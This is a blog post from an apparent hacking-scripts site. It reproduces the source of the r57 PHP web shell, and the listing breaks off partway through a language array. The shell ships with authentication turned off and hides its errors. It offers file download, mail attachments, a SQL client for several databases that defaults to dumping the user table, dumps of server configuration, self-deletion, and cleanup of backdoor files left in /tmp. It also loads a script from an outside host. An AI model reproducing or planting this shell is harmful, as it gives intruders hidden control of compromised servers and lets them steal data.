---
id: 181
title: r57 Shell (encrypted)
author: admin
layout: post
guid: http://hackingscripts.com/?p=181
permalink: /r57-shell-encrypted/
categories:
  - PHP
  - r57
tags:
  - PHP
  - r57
---
I&#8217;m pretty sure the r57 and c99 shells are more or less the same, but this r57 shell does look quite different to the usual c99 script.

## r57 Shell Source Code

<pre class="brush: php; title: ; notranslate" title="">&lt;?php
/******************************************************************************************************/
/*										 WW.R57.GEN.TR
/*                                     #    #        #    #
/*                                     #   #          #   #
/*                                    #    #          #    #
/*                                    #   ##   ####   ##   #
/*                                   ##   ##  ######  ##   ##
/*                                   ##   ##  ######  ##   ##
/*                                   ##   ##   ####   ##   ##g
/*                                   ###   ############   ###
/*                                   ########################
/*                                 ######## ########## #######
/*                                ###   ##  ##########  ##   ###
/*                                ###   ##  ##########  ##   ###
/*                                 ###   #  ##########  #   ###
/*                                 ###   ##  ########  ##   ###
/*                                  ##    #   ######   #    ##
/*                                   ##   #    ####   #    ##
/*                                     ##                 ##
/*								WWW.R57.GEN.TR Hacking Shell Security
/*
/*
/*  r57shell // r57.gen.tr
/* ~~~ ????????? | Options  ~~~ */
// ????? ????? | Language
// $language='tur' - turkish (Turkce)
$language='tur';
// ?????????????? | Authentification
// $auth = 1; - ?????????????? ????????  ( authentification = On  )
// $auth = 0; - ?????????????? ????????? ( authentification = Off )
$auth = 0;

// ????? ? ?????? ??? ??????? ? ??????? (Login & Password for access)
// ?? ???????? ??????? ????? ??????????? ?? ???????!!! (CHANGE THIS!!!)
// ????? ? ?????? ????????? ? ??????? ????????? md5, ???????? ?? ????????? 'r57'
// Login & password crypted with md5, default is 'r57'
$name='r57'; // ????? ????????????  (user login)
$pass='r57'; // ?????? ???????????? (user password)
/******************************************************************************************************/
error_reporting(0);
set_magic_quotes_runtime(0);
@set_time_limit(0);
@ini_set('max_execution_time',0);
@ini_set('output_buffering',0);
$safe_mode = @ini_get('safe_mode');
$version = "1.0";
if(version_compare(phpversion(), '4.1.0') == -1)
 {
 $_POST   = &$HTTP_POST_VARS;
 $_GET    = &$HTTP_GET_VARS;
 $_SERVER = &$HTTP_SERVER_VARS;
 }
if (@get_magic_quotes_gpc())
 {
 foreach ($_POST as $k=&gt;$v)
  {
  $_POST[$k] = stripslashes($v);
  }
 foreach ($_SERVER as $k=&gt;$v)
  {
  $_SERVER[$k] = stripslashes($v);
  }
 }

if($auth == 1) {
if (!isset($_SERVER['PHP_AUTH_USER']) || md5($_SERVER['PHP_AUTH_USER'])!==$name || md5($_SERVER['PHP_AUTH_PW'])!==$pass)
   {
   header('WWW-Authenticate: Basic realm="r57shell"');
   header('HTTP/1.0 401 Unauthorized');
   exit("&lt;b&gt;&lt;a href=http://www.metalteam.org&gt;metalteam.orgs&lt;/a&gt; : Izin Verilmedi&lt;/b&gt;");
   }
}
$head = '&lt;!-- ??????????  ???? --&gt;
&lt;html&gt;
&lt;head&gt;
&lt;SCRIPT SRC=http://www.r57.gen.tr/yazciz/ciz.js&gt;&lt;/SCRIPT&gt;
&lt;meta http-equiv="Content-Type" content="text/html; charset=windows-1251"&gt;

&lt;STYLE&gt;
tr {
BORDER-RIGHT:  #aaaaaa 1px solid;
BORDER-TOP:    #E8481C 1px solid;
BORDER-LEFT:   #E8481C 1px solid;
BORDER-BOTTOM: #aaaaaa 1px solid;
}
td {
BORDER-RIGHT:  #aaaaaa 1px solid;
BORDER-TOP:    #E8481C 1px solid;
BORDER-LEFT:   #E8481C 1px solid;
BORDER-BOTTOM: #aaaaaa 1px solid;
}
.table1 {
BORDER-RIGHT:  #396D95 0px;
BORDER-TOP:    #396D95 0px;
BORDER-LEFT:   #396D95 0px;
BORDER-BOTTOM: #396D95 0px;
BACKGROUND-COLOR: #396D95
}
.td1 {
BORDER-RIGHT:  #396D95 0px;
BORDER-TOP:    #396D95 0px;
BORDER-LEFT:   #396D95 0px;
BORDER-BOTTOM: #396D95 0px;
font: 7pt Verdana;
}
.tr1 {
BORDER-RIGHT:  #396D95 0px;
BORDER-TOP:    #396D95 0px;
BORDER-LEFT:   #396D95 0px;
BORDER-BOTTOM: #396D95 0px;
}
table {
BORDER-RIGHT:  #E8481C 1px outset;
BORDER-TOP:    #E8481C 1px outset;
BORDER-LEFT:   #E8481C 1px outset;
BORDER-BOTTOM: #E8481C 1px outset;
BACKGROUND-COLOR: #396D95;
}
input {
BORDER-RIGHT:  #000000 1px solid;
BORDER-TOP:    #FC602B 1px solid;
BORDER-LEFT:   #FC602B 1px solid;
BORDER-BOTTOM: #000000 1px solid;
BACKGROUND-COLOR: #396D95;
font: 8pt Verdana;
}
select {
BORDER-RIGHT:  #000000 1px solid;
BORDER-TOP:    #D55022 1px solid;
BORDER-LEFT:   #D55022 1px solid;
BORDER-BOTTOM: #000000 1px solid;
BACKGROUND-COLOR: #396D95;
font: 8pt Verdana;
}
submit {
BORDER-RIGHT:  buttonhighlight 2px outset;
BORDER-TOP:    buttonhighlight 2px outset;
BORDER-LEFT:   buttonhighlight 2px outset;
BORDER-BOTTOM: buttonhighlight 2px outset;
BACKGROUND-COLOR: #396D95;
width: 30%;
}
textarea {
BORDER-RIGHT:  #000000 1px solid;
BORDER-TOP:    #D55022 1px solid;
BORDER-LEFT:   #D55022 1px solid;
BORDER-BOTTOM: #000000 1px solid;
BACKGROUND-COLOR: #396D95;
font: Fixedsys bold;
}
BODY {
margin-top: 1px;
margin-right: 1px;
margin-bottom: 1px;
margin-left: 1px;
}
A:link {COLOR:orange; TEXT-DECORATION: none}
A:visited { COLOR:orange; TEXT-DECORATION: none}
A:active {COLOR:orange; TEXT-DECORATION: none}
A:hover {color:#BF0F0F;TEXT-DECORATION: none}
&lt;/STYLE&gt;';
class zipfile
{
    var $datasec      = array();
    var $ctrl_dir     = array();
    var $eof_ctrl_dir = "\x50\x4b\x05\x06\x00\x00\x00\x00";
    var $old_offset   = 0;
    function unix2DosTime($unixtime = 0) {
        $timearray = ($unixtime == 0) ? getdate() : getdate($unixtime);
        if ($timearray['year'] &lt; 1980) {
            $timearray['year']    = 1980;
            $timearray['mon']     = 1;
            $timearray['mday']    = 1;
            $timearray['hours']   = 0;
            $timearray['minutes'] = 0;
            $timearray['seconds'] = 0;
        }
        return (($timearray['year'] - 1980) &lt;&lt; 25) | ($timearray['mon'] &lt;&lt; 21) | ($timearray['mday'] &lt;&lt; 16) |
                ($timearray['hours'] &lt;&lt; 11) | ($timearray['minutes'] &lt;&lt; 5) | ($timearray['seconds'] &gt;&gt; 1);
    }
    function addFile($data, $name, $time = 0)
    {
        $name     = str_replace('\\', '/', $name);
        $dtime    = dechex($this-&gt;unix2DosTime($time));
        $hexdtime = '\x' . $dtime[6] . $dtime[7]
                  . '\x' . $dtime[4] . $dtime[5]
                  . '\x' . $dtime[2] . $dtime[3]
                  . '\x' . $dtime[0] . $dtime[1];
        eval('$hexdtime = "' . $hexdtime . '";');
        $fr   = "\x50\x4b\x03\x04";
        $fr   .= "\x14\x00";
        $fr   .= "\x00\x00";
        $fr   .= "\x08\x00";
        $fr   .= $hexdtime;
        $unc_len = strlen($data);
        $crc     = crc32($data);
        $zdata   = gzcompress($data);
        $zdata   = substr(substr($zdata, 0, strlen($zdata) - 4), 2);
        $c_len   = strlen($zdata);
        $fr      .= pack('V', $crc);
        $fr      .= pack('V', $c_len);
        $fr      .= pack('V', $unc_len);
        $fr      .= pack('v', strlen($name));
        $fr      .= pack('v', 0);
        $fr      .= $name;
        $fr .= $zdata;
        $this -&gt; datasec[] = $fr;
        $cdrec = "\x50\x4b\x01\x02";
        $cdrec .= "\x00\x00";
        $cdrec .= "\x14\x00";
        $cdrec .= "\x00\x00";
        $cdrec .= "\x08\x00";
        $cdrec .= $hexdtime;
        $cdrec .= pack('V', $crc);
        $cdrec .= pack('V', $c_len);
        $cdrec .= pack('V', $unc_len);
        $cdrec .= pack('v', strlen($name) );
        $cdrec .= pack('v', 0 );
        $cdrec .= pack('v', 0 );
        $cdrec .= pack('v', 0 );
        $cdrec .= pack('v', 0 );
        $cdrec .= pack('V', 32 );
        $cdrec .= pack('V', $this -&gt; old_offset );
        $this -&gt; old_offset += strlen($fr);
        $cdrec .= $name;
        $this -&gt; ctrl_dir[] = $cdrec;
    }
    function file()
    {
        $data    = implode('', $this -&gt; datasec);
        $ctrldir = implode('', $this -&gt; ctrl_dir);
        return
            $data .
            $ctrldir .
            $this -&gt; eof_ctrl_dir .
            pack('v', sizeof($this -&gt; ctrl_dir)) .
            pack('v', sizeof($this -&gt; ctrl_dir)) .
            pack('V', strlen($ctrldir)) .
            pack('V', strlen($data)) .
            "\x00\x00";
    }
}
function compress(&$filename,&$filedump,$compress)
 {
    global $content_encoding;
    global $mime_type;
    if ($compress == 'bzip' && @function_exists('bzcompress'))
     {
        $filename  .= '.bz2';
        $mime_type = 'application/x-bzip2';
        $filedump = bzcompress($filedump);
     }
     else if ($compress == 'gzip' && @function_exists('gzencode'))
     {
        $filename  .= '.gz';
        $content_encoding = 'x-gzip';
        $mime_type = 'application/x-gzip';
        $filedump = gzencode($filedump);
     }
     else if ($compress == 'zip' && @function_exists('gzcompress'))
     {
     	$filename .= '.zip';
        $mime_type = 'application/zip';
        $zipfile = new zipfile();
        $zipfile -&gt; addFile($filedump, substr($filename, 0, -4));
        $filedump = $zipfile -&gt; file();
     }
     else
     {
     	$mime_type = 'application/octet-stream';
     }
 }
function mailattach($to,$from,$subj,$attach)
 {
 $headers  = "From: $from\r\n";
 $headers .= "MIME-Version: 1.0\r\n";
 $headers .= "Content-Type: ".$attach['type'];
 $headers .= "; name=\"".$attach['name']."\"\r\n";
 $headers .= "Content-Transfer-Encoding: base64\r\n\r\n";
 $headers .= chunk_split(base64_encode($attach['content']))."\r\n";
 if(@mail($to,$subj,"",$headers)) { return 1; }
 return 0;
 }
class my_sql
 {
 var $host = 'localhost';
 var $port = '';
 var $user = '';
 var $pass = '';
 var $base = '';
 var $db   = '';
 var $connection;
 var $res;
 var $error;
 var $rows;
 var $columns;
 var $num_rows;
 var $num_fields;
 var $dump;

 function connect()
  {
  	switch($this-&gt;db)
     {
  	 case 'MySQL':
  	  if(empty($this-&gt;port)) { $this-&gt;port = '3306'; }
  	  if(!function_exists('mysql_connect')) return 0;
  	  $this-&gt;connection = @mysql_connect($this-&gt;host.':'.$this-&gt;port,$this-&gt;user,$this-&gt;pass);
  	  if(is_resource($this-&gt;connection)) return 1;
  	 break;
     case 'MSSQL':
      if(empty($this-&gt;port)) { $this-&gt;port = '1433'; }
  	  if(!function_exists('mssql_connect')) return 0;
  	  $this-&gt;connection = @mssql_connect($this-&gt;host.','.$this-&gt;port,$this-&gt;user,$this-&gt;pass);
      if($this-&gt;connection) return 1;
     break;
     case 'PostgreSQL':
      if(empty($this-&gt;port)) { $this-&gt;port = '5432'; }
      $str = "host='".$this-&gt;host."' port='".$this-&gt;port."' user='".$this-&gt;user."' password='".$this-&gt;pass."' dbname='".$this-&gt;base."'";
      if(!function_exists('pg_connect')) return 0;
      $this-&gt;connection = @pg_connect($str);
      if(is_resource($this-&gt;connection)) return 1;
     break;
     case 'Oracle':
      if(!function_exists('ocilogon')) return 0;
      $this-&gt;connection = @ocilogon($this-&gt;user, $this-&gt;pass, $this-&gt;base);
      if(is_resource($this-&gt;connection)) return 1;
     break;
     }
    return 0;
  }

 function select_db()
  {
   switch($this-&gt;db)
    {
  	case 'MySQL':
  	 if(@mysql_select_db($this-&gt;base,$this-&gt;connection)) return 1;
    break;
    case 'MSSQL':
  	 if(@mssql_select_db($this-&gt;base,$this-&gt;connection)) return 1;
    break;
    case 'PostgreSQL':
     return 1;
    break;
    case 'Oracle':
     return 1;
    break;
    }
   return 0;
  }

 function query($query)
  {
   $this-&gt;res=$this-&gt;error='';
   switch($this-&gt;db)
    {
  	case 'MySQL':
     if(false===($this-&gt;res=@mysql_query('/*'.chr(0).'*/'.$query,$this-&gt;connection)))
      {
      $this-&gt;error = @mysql_error($this-&gt;connection);
      return 0;
      }
     else if(is_resource($this-&gt;res)) { return 1; }
     return 2;
  	break;
    case 'MSSQL':
     if(false===($this-&gt;res=@mssql_query($query,$this-&gt;connection)))
      {
      $this-&gt;error = 'Query error';
      return 0;
      }
      else if(@mssql_num_rows($this-&gt;res) &gt; 0) { return 1; }
     return 2;
    break;
    case 'PostgreSQL':
     if(false===($this-&gt;res=@pg_query($this-&gt;connection,$query)))
      {
      $this-&gt;error = @pg_last_error($this-&gt;connection);
      return 0;
      }
      else if(@pg_num_rows($this-&gt;res) &gt; 0) { return 1; }
     return 2;
    break;
    case 'Oracle':
     if(false===($this-&gt;res=@ociparse($this-&gt;connection,$query)))
      {
      $this-&gt;error = 'Query parse error';
      }
     else
      {
      if(@ociexecute($this-&gt;res))
       {
       if(@ocirowcount($this-&gt;res) != 0) return 2;
       return 1;
       }
      $error = @ocierror();
      $this-&gt;error=$error['message'];
      }
    break;
    }
  return 0;
  }
 function get_result()
  {
   $this-&gt;rows=array();
   $this-&gt;columns=array();
   $this-&gt;num_rows=$this-&gt;num_fields=0;
   switch($this-&gt;db)
    {
  	case 'MySQL':
  	 $this-&gt;num_rows=@mysql_num_rows($this-&gt;res);
  	 $this-&gt;num_fields=@mysql_num_fields($this-&gt;res);
  	 while(false !== ($this-&gt;rows[] = @mysql_fetch_assoc($this-&gt;res)));
  	 @mysql_free_result($this-&gt;res);
  	 if($this-&gt;num_rows){$this-&gt;columns = @array_keys($this-&gt;rows[0]); return 1;}
    break;
    case 'MSSQL':
  	 $this-&gt;num_rows=@mssql_num_rows($this-&gt;res);
  	 $this-&gt;num_fields=@mssql_num_fields($this-&gt;res);
  	 while(false !== ($this-&gt;rows[] = @mssql_fetch_assoc($this-&gt;res)));
  	 @mssql_free_result($this-&gt;res);
  	 if($this-&gt;num_rows){$this-&gt;columns = @array_keys($this-&gt;rows[0]); return 1;};
    break;
    case 'PostgreSQL':
  	 $this-&gt;num_rows=@pg_num_rows($this-&gt;res);
  	 $this-&gt;num_fields=@pg_num_fields($this-&gt;res);
  	 while(false !== ($this-&gt;rows[] = @pg_fetch_assoc($this-&gt;res)));
  	 @pg_free_result($this-&gt;res);
  	 if($this-&gt;num_rows){$this-&gt;columns = @array_keys($this-&gt;rows[0]); return 1;}
    break;
    case 'Oracle':
     $this-&gt;num_fields=@ocinumcols($this-&gt;res);
     while(false !== ($this-&gt;rows[] = @oci_fetch_assoc($this-&gt;res))) $this-&gt;num_rows++;
     @ocifreestatement($this-&gt;res);
     if($this-&gt;num_rows){$this-&gt;columns = @array_keys($this-&gt;rows[0]); return 1;}
    break;
    }
   return 0;
  }
 function dump($table)
  {
   if(empty($table)) return 0;
   $this-&gt;dump=array();
   $this-&gt;dump[0] = '##';
   $this-&gt;dump[1] = '## --------------------------------------- ';
   $this-&gt;dump[2] = '##  Created: '.date ("d/m/Y H:i:s");
   $this-&gt;dump[3] = '## Database: '.$this-&gt;base;
   $this-&gt;dump[4] = '##    Table: '.$table;
   $this-&gt;dump[5] = '## --------------------------------------- ';
   switch($this-&gt;db)
    {
  	case 'MySQL':
  	 $this-&gt;dump[0] = '## MySQL dump';
  	 if($this-&gt;query('/*'.chr(0).'*/ SHOW CREATE TABLE `'.$table.'`')!=1) return 0;
  	 if(!$this-&gt;get_result()) return 0;
  	 $this-&gt;dump[] = $this-&gt;rows[0]['Create Table'];
     $this-&gt;dump[] = '## --------------------------------------- ';
  	 if($this-&gt;query('/*'.chr(0).'*/ SELECT * FROM `'.$table.'`')!=1) return 0;
  	 if(!$this-&gt;get_result()) return 0;
  	 for($i=0;$i&lt;$this-&gt;num_rows;$i++)
  	  {
      foreach($this-&gt;rows[$i] as $k=&gt;$v) {$this-&gt;rows[$i][$k] = @mysql_real_escape_string($v);}
  	  $this-&gt;dump[] = 'INSERT INTO `'.$table.'` (`'.@implode("`, `", $this-&gt;columns).'`) VALUES (\''.@implode("', '", $this-&gt;rows[$i]).'\');';
  	  }
    break;
    case 'MSSQL':
     $this-&gt;dump[0] = '## MSSQL dump';
     if($this-&gt;query('SELECT * FROM '.$table)!=1) return 0;
  	 if(!$this-&gt;get_result()) return 0;
  	 for($i=0;$i&lt;$this-&gt;num_rows;$i++)
  	  {
      foreach($this-&gt;rows[$i] as $k=&gt;$v) {$this-&gt;rows[$i][$k] = @addslashes($v);}
  	  $this-&gt;dump[] = 'INSERT INTO '.$table.' ('.@implode(", ", $this-&gt;columns).') VALUES (\''.@implode("', '", $this-&gt;rows[$i]).'\');';
  	  }
    break;
    case 'PostgreSQL':
     $this-&gt;dump[0] = '## PostgreSQL dump';
     if($this-&gt;query('SELECT * FROM '.$table)!=1) return 0;
  	 if(!$this-&gt;get_result()) return 0;
  	 for($i=0;$i&lt;$this-&gt;num_rows;$i++)
  	  {
      foreach($this-&gt;rows[$i] as $k=&gt;$v) {$this-&gt;rows[$i][$k] = @addslashes($v);}
  	  $this-&gt;dump[] = 'INSERT INTO '.$table.' ('.@implode(", ", $this-&gt;columns).') VALUES (\''.@implode("', '", $this-&gt;rows[$i]).'\');';
  	  }
    break;
    case 'Oracle':
      $this-&gt;dump[0] = '## ORACLE dump';
      $this-&gt;dump[]  = '## under construction';
    break;
    default:
     return 0;
    break;
    }
   return 1;
  }
 function close()
  {
   switch($this-&gt;db)
    {
  	case 'MySQL':
  	 @mysql_close($this-&gt;connection);
    break;
    case 'MSSQL':
     @mssql_close($this-&gt;connection);
    break;
    case 'PostgreSQL':
     @pg_close($this-&gt;connection);
    break;
    case 'Oracle':
     @oci_close($this-&gt;connection);
    break;
    }
  }
 function affected_rows()
  {
   switch($this-&gt;db)
    {
  	case 'MySQL':
  	 return @mysql_affected_rows($this-&gt;res);
    break;
    case 'MSSQL':
     return @mssql_affected_rows($this-&gt;res);
    break;
    case 'PostgreSQL':
     return @pg_affected_rows($this-&gt;res);
    break;
    case 'Oracle':
     return @ocirowcount($this-&gt;res);
    break;
    default:
     return 0;
    break;
    }
  }
 }
if(isset($_GET['img'])&&!empty($_GET['img']))
 {
 $images = array();
 $images[1]='R0lGODlhBwAHAIAAAAAAAP///yH5BAEAAAEALAAAAAAHAAcAAAILjI9pkODnYohUhQIAOw==';
 $images[2]='R0lGODlhBwAHAIAAAAAAAP///yH5BAEAAAEALAAAAAAHAAcAAAILjI+pwA3hnmlJhgIAOw==';
 @ob_clean();
 header("Content-type: image/gif");
 echo base64_decode($images[$_GET['img']]);
 die();
 }
if(isset($_POST['cmd']) && !empty($_POST['cmd']) && $_POST['cmd']=="download_file" && !empty($_POST['d_name']))
 {
  if(!$file=@fopen($_POST['d_name'],"r")) { echo re($_POST['d_name']); $_POST['cmd']=""; }
  else
   {
    @ob_clean();
    $filename = @basename($_POST['d_name']);
    $filedump = @fread($file,@filesize($_POST['d_name']));
    fclose($file);
    $content_encoding=$mime_type='';
    compress($filename,$filedump,$_POST['compress']);
    if (!empty($content_encoding)) { header('Content-Encoding: ' . $content_encoding); }
    header("Content-type: ".$mime_type);
    header("Content-disposition: attachment; filename=\"".$filename."\";");
    echo $filedump;
    exit();
   }
 }
if(isset($_GET['phpinfo'])) { echo @phpinfo(); echo "&lt;br&gt;&lt;div align=center&gt;&lt;font face=Verdana size=-2&gt;&lt;b&gt;[ &lt;a href=".$_SERVER['PHP_SELF']."&gt;Geri&lt;/a&gt; ]&lt;/b&gt;&lt;/font&gt;&lt;/div&gt;"; die(); }
if ($_POST['cmd']=="db_query")
 {
 echo $head;
 $sql = new my_sql();
 $sql-&gt;db   = $_POST['db'];
 $sql-&gt;host = $_POST['db_server'];
 $sql-&gt;port = $_POST['db_port'];
 $sql-&gt;user = $_POST['mysql_l'];
 $sql-&gt;pass = $_POST['mysql_p'];
 $sql-&gt;base = $_POST['mysql_db'];
 $querys = @explode(';',$_POST['db_query']);

 if(!$sql-&gt;connect()) echo "&lt;div align=center&gt;&lt;font face=Verdana size=-2 color=orange&gt;&lt;b&gt;Sql Server ile Baglant? Kurulamad? &lt;/b&gt;&lt;/font&gt;&lt;/div&gt;";
  else
   {
   if(!empty($sql-&gt;base)&&!$sql-&gt;select_db()) echo "&lt;div align=center&gt;&lt;font face=Verdana size=-2 color=orange&gt;&lt;b&gt;DataBase Girilmedi&lt;/b&gt;&lt;/font&gt;&lt;/div&gt;";
   else
    {
    foreach($querys as $num=&gt;$query)
     {
      if(strlen($query)&gt;5)
      {
      echo "&lt;font face=Verdana size=-2 color=white&gt;&lt;b&gt;Query#".$num." : ".htmlspecialchars($query,ENT_QUOTES)."&lt;/b&gt;&lt;/font&gt;&lt;br&gt;";
      switch($sql-&gt;query($query))
       {
       case '0':
       echo "&lt;table width=100%&gt;&lt;tr&gt;&lt;td&gt;&lt;font face=Verdana size=-2&gt;Error : &lt;b&gt;".$sql-&gt;error."&lt;/b&gt;&lt;/font&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;";
       break;
       case '1':
       if($sql-&gt;get_result())
        {
       	echo "&lt;table width=100%&gt;";
        foreach($sql-&gt;columns as $k=&gt;$v) $sql-&gt;columns[$k] = htmlspecialchars($v,ENT_QUOTES);
       	$keys = @implode("&nbsp;&lt;/b&gt;&lt;/font&gt;&lt;/td&gt;&lt;td bgcolor=#396D95&gt;&lt;font face=Verdana size=-2&gt;&lt;b&gt;&nbsp;", $sql-&gt;columns);
        echo "&lt;tr&gt;&lt;td bgcolor=#396D95&gt;&lt;font face=Verdana size=-2&gt;&lt;b&gt;&nbsp;".$keys."&nbsp;&lt;/b&gt;&lt;/font&gt;&lt;/td&gt;&lt;/tr&gt;";
        for($i=0;$i&lt;$sql-&gt;num_rows;$i++)
         {
         foreach($sql-&gt;rows[$i] as $k=&gt;$v) $sql-&gt;rows[$i][$k] = htmlspecialchars($v,ENT_QUOTES);
         $values = @implode("&nbsp;&lt;/font&gt;&lt;/td&gt;&lt;td&gt;&lt;font face=Verdana size=-2&gt;&nbsp;",$sql-&gt;rows[$i]);
         echo '&lt;tr&gt;&lt;td&gt;&lt;font face=Verdana size=-2&gt;&nbsp;'.$values.'&nbsp;&lt;/font&gt;&lt;/td&gt;&lt;/tr&gt;';
         }
        echo "&lt;/table&gt;";
        }
       break;
       case '2':
       $ar = $sql-&gt;affected_rows()?($sql-&gt;affected_rows()):('0');
       echo "&lt;table width=100%&gt;&lt;tr&gt;&lt;td&gt;&lt;font face=Verdana size=-2&gt;affected rows : &lt;b&gt;".$ar."&lt;/b&gt;&lt;/font&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;br&gt;";
       break;
       }
      }
     }
    }
   }
 echo "&lt;br&gt;&lt;form name=form method=POST&gt;";
 echo in('hidden','db',0,$_POST['db']);
 echo in('hidden','db_server',0,$_POST['db_server']);
 echo in('hidden','db_port',0,$_POST['db_port']);
 echo in('hidden','mysql_l',0,$_POST['mysql_l']);
 echo in('hidden','mysql_p',0,$_POST['mysql_p']);
 echo in('hidden','mysql_db',0,$_POST['mysql_db']);
 echo in('hidden','cmd',0,'db_query');
 echo "&lt;div align=center&gt;&lt;textarea cols=65 rows=10 name=db_query&gt;".(!empty($_POST['db_query'])?($_POST['db_query']):("SHOW DATABASES;\nSELECT * FROM user;"))."&lt;/textarea&gt;&lt;br&gt;&lt;input type=submit name=submit value=\" Run SQL query \"&gt;&lt;/div&gt;&lt;br&gt;&lt;br&gt;";
 echo "&lt;/form&gt;";
 echo "&lt;br&gt;&lt;div align=center&gt;&lt;font face=Verdana size=-2&gt;&lt;b&gt;[ &lt;a href=".$_SERVER['PHP_SELF']."&gt;BACK&lt;/a&gt; ]&lt;/b&gt;&lt;/font&gt;&lt;/div&gt;"; die();
 }
if(isset($_GET['delete']))
 {
   @unlink(@substr(@strrchr($_SERVER['PHP_SELF'],"/"),1));
 }
if(isset($_GET['tmp']))
 {
   @unlink("/tmp/bdpl");
   @unlink("/tmp/back");
   @unlink("/tmp/bd");
   @unlink("/tmp/bd.c");
   @unlink("/tmp/dp");
   @unlink("/tmp/dpc");
   @unlink("/tmp/dpc.c");
 }
if(isset($_GET['phpini']))
{
echo $head;
function U_value($value)
 {
 if ($value == '') return '&lt;i&gt;no value&lt;/i&gt;';
 if (@is_bool($value)) return $value ? 'TRUE' : 'FALSE';
 if ($value === null) return 'NULL';
 if (@is_object($value)) $value = (array) $value;
 if (@is_array($value))
 {
 @ob_start();
 print_r($value);
 $value = @ob_get_contents();
 @ob_end_clean();
 }
 return U_wordwrap((string) $value);
 }
function U_wordwrap($str)
 {
 $str = @wordwrap(@htmlspecialchars($str), 100, '&lt;wbr /&gt;', true);
 return @preg_replace('!(&[^;]*)&lt;wbr /&gt;([^;]*;)!', '$1$2&lt;wbr /&gt;', $str);
 }
if (@function_exists('ini_get_all'))
 {
 $r = '';
 echo '&lt;table width=100%&gt;', '&lt;tr&gt;&lt;td bgcolor=#396D95&gt;&lt;font face=Verdana size=-2 color=orange&gt;&lt;div align=center&gt;&lt;b&gt;Directive&lt;/b&gt;&lt;/div&gt;&lt;/font&gt;&lt;/td&gt;&lt;td bgcolor=#396D95&gt;&lt;font face=Verdana size=-2 color=orange&gt;&lt;div align=center&gt;&lt;b&gt;Local Value&lt;/b&gt;&lt;/div&gt;&lt;/font&gt;&lt;/td&gt;&lt;td bgcolor=#396D95&gt;&lt;font face=Verdana size=-2 color=orange&gt;&lt;div align=center&gt;&lt;b&gt;Master Value&lt;/b&gt;&lt;/div&gt;&lt;/font&gt;&lt;/td&gt;&lt;/tr&gt;';
 foreach (@ini_get_all() as $key=&gt;$value)
  {
  $r .= '&lt;tr&gt;&lt;td&gt;'.ws(3).'&lt;font face=Verdana size=-2&gt;&lt;b&gt;'.$key.'&lt;/b&gt;&lt;/font&gt;&lt;/td&gt;&lt;td&gt;&lt;font face=Verdana size=-2&gt;&lt;div align=center&gt;&lt;b&gt;'.U_value($value['local_value']).'&lt;/b&gt;&lt;/div&gt;&lt;/font&gt;&lt;/td&gt;&lt;td&gt;&lt;font face=Verdana size=-2&gt;&lt;div align=center&gt;&lt;b&gt;'.U_value($value['global_value']).'&lt;/b&gt;&lt;/div&gt;&lt;/font&gt;&lt;/td&gt;&lt;/tr&gt;';
  }
 echo $r;
 echo '&lt;/table&gt;';
 }
echo "&lt;br&gt;&lt;div align=center&gt;&lt;font face=Verdana size=-2&gt;&lt;b&gt;[ &lt;a href=".$_SERVER['PHP_SELF']."&gt;BACK&lt;/a&gt; ]&lt;/b&gt;&lt;/font&gt;&lt;/div&gt;";
die();
}
if(isset($_GET['cpu']))
 {
   echo $head;
   echo '&lt;table width=100%&gt;&lt;tr&gt;&lt;td bgcolor=#396D95&gt;&lt;div align=center&gt;&lt;font face=Verdana size=-2 color=orange&gt;&lt;b&gt;CPU&lt;/b&gt;&lt;/font&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;table width=100%&gt;';
   $cpuf = @file("cpuinfo");
   if($cpuf)
    {
      $c = @sizeof($cpuf);
      for($i=0;$i&lt;$c;$i++)
        {
          $info = @explode(":",$cpuf[$i]);
          if($info[1]==""){ $info[1]="---"; }
          $r .= '&lt;tr&gt;&lt;td&gt;'.ws(3).'&lt;font face=Verdana size=-2&gt;&lt;b&gt;'.trim($info[0]).'&lt;/b&gt;&lt;/font&gt;&lt;/td&gt;&lt;td&gt;&lt;font face=Verdana size=-2&gt;&lt;div align=center&gt;&lt;b&gt;'.trim($info[1]).'&lt;/b&gt;&lt;/div&gt;&lt;/font&gt;&lt;/td&gt;&lt;/tr&gt;';
        }
      echo $r;
    }
   else
    {
      echo '&lt;tr&gt;&lt;td&gt;'.ws(3).'&lt;div align=center&gt;&lt;font face=Verdana size=-2&gt;&lt;b&gt; --- &lt;/b&gt;&lt;/font&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;';
    }
   echo '&lt;/table&gt;';
   echo "&lt;br&gt;&lt;div align=center&gt;&lt;font face=Verdana size=-2&gt;&lt;b&gt;[ &lt;a href=".$_SERVER['PHP_SELF']."&gt;BACK&lt;/a&gt; ]&lt;/b&gt;&lt;/font&gt;&lt;/div&gt;";
   die();
 }
if(isset($_GET['mem']))
 {
   echo $head;
   echo '&lt;table width=100%&gt;&lt;tr&gt;&lt;td bgcolor=#396D95&gt;&lt;div align=center&gt;&lt;font face=Verdana size=-2 color=orange&gt;&lt;b&gt;MEMORY&lt;/b&gt;&lt;/font&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;table width=100%&gt;';
   $memf = @file("meminfo");
   if($memf)
    {
      $c = sizeof($memf);
      for($i=0;$i&lt;$c;$i++)
        {
          $info = explode(":",$memf[$i]);
          if($info[1]==""){ $info[1]="---"; }
          $r .= '&lt;tr&gt;&lt;td&gt;'.ws(3).'&lt;font face=Verdana size=-2&gt;&lt;b&gt;'.trim($info[0]).'&lt;/b&gt;&lt;/font&gt;&lt;/td&gt;&lt;td&gt;&lt;font face=Verdana size=-2&gt;&lt;div align=center&gt;&lt;b&gt;'.trim($info[1]).'&lt;/b&gt;&lt;/div&gt;&lt;/font&gt;&lt;/td&gt;&lt;/tr&gt;';
        }
      echo $r;
    }
   else
    {
      echo '&lt;tr&gt;&lt;td&gt;'.ws(3).'&lt;div align=center&gt;&lt;font face=Verdana size=-2&gt;&lt;b&gt; --- &lt;/b&gt;&lt;/font&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;';
    }
   echo '&lt;/table&gt;';
   echo "&lt;br&gt;&lt;div align=center&gt;&lt;font face=Verdana size=-2&gt;&lt;b&gt;[ &lt;a href=".$_SERVER['PHP_SELF']."&gt;BACK&lt;/a&gt; ]&lt;/b&gt;&lt;/font&gt;&lt;/div&gt;";
   die();
 }
$lang=array(
'ru_text1' =&gt;'??????????? ???????',
